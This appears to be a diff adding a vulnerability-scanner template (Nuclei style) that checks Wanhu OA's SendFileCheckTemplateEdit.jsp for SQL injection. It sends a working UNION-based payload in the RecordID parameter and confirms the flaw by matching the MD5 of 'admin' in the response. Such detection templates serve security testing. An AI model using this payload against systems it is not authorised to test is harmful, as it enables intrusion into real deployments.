@@ -1,0 +1,27 @@
+id: wanhuOA_SendFileCheckTemplateEdit_sqli
+info:
+  name: 万户SendFileCheckTemplateEdit-SQL注入
+  author: mhb17
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: sqli
+http:
+  - raw:
+      - |+
+        GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27admin%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - "21232f297a57a5a743894a0e4a801fc3"
